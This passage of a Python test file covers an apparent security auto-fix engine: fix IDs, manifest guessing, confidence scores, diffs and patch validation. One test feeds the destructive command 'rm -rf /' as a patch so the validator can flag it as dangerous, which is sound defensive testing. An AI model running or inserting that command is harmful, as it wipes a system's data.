        # Check 3: no code patches with empty new_code → pass
        # Check 4: no dep fixes with bad versions → pass
        assert result["checks_passed"] >= 3

    def test_infer_fix_type_description_participates(self):
        f = {"title": "Vulnerability", "description": "Uses an outdated component"}
        result = AutoFixEngine._infer_fix_type(f)
        assert result == FixType.DEPENDENCY_UPDATE

    def test_make_fix_id_sha256_based_hex_valid(self):
        fid = AutoFixEngine._make_fix_id("test-finding", FixType.CODE_PATCH)
        hex_part = fid[4:]
        int(hex_part, 16)  # Should not raise

    def test_guess_manifest_returns_nonempty_for_all_known(self):
        known = ["npm", "pip", "poetry", "maven", "gradle", "cargo", "go", "nuget", "gem", "composer"]
        for eco in known:
            manifest = AutoFixEngine._guess_manifest(eco)
            assert manifest, f"Empty manifest for ecosystem: {eco}"

    def test_build_manifest_update_maven_contains_version(self):
        dep = DependencyFix(package_name="com.example.lib", ecosystem="maven", fixed_version="3.1.4")
        result = AutoFixEngine._build_manifest_update(dep)
        assert "3.1.4" in result

    def test_confidence_fallback_all_fix_types_in_range(self):
        for ft in FixType:
            s = AutoFixSuggestion(fix_type=ft, metadata={})
            score = AutoFixEngine._compute_confidence_fallback(s, {})
            assert 0.1 <= score <= 0.99, f"Score {score} out of range for FixType.{ft.name}"

    def test_validate_fix_multiple_dangerous_patches_multiple_issues(self):
        engine = make_engine()
        s = AutoFixSuggestion(
            code_patches=[
                CodePatch(file_path="a.py", new_code=""),          # empty new_code
                CodePatch(file_path="b.py", new_code="rm -rf /"),  # dangerous
            ]
        )
        result = engine._validate_fix(s)
        assert len(result["issues"]) >= 2

    def test_list_fixes_returns_list(self):
        e = make_engine()
        result = e.list_fixes()
        assert isinstance(result, list)

    def test_unified_diff_deterministic(self):
        old = "x = 1\n"
        new = "x = 2\n"
        diff1 = AutoFixEngine._make_unified_diff("test.py", old, new)
        diff2 = AutoFixEngine._make_unified_diff("test.py", old, new)
        assert diff1 == diff2

    def test_make_fix_id_format_stable(self):
        # Multiple calls should all produce correctly formatted IDs
        for _ in range(5):
            fid = AutoFixEngine._make_fix_id("FIND-STABLE", FixType.CODE_PATCH)
            assert fid.startswith("fix-")
            assert len(fid) == 20
            assert all(c in "0123456789abcdef" for c in fid[4:])

    def test_autofix_result_fix_reference_not_copy(self):
        s = AutoFixSuggestion(fix_id="fix-ref-test")
        r = AutoFixResult(fix=s)
        r.fix.title = "Modified"
        assert s.title == "Modified"
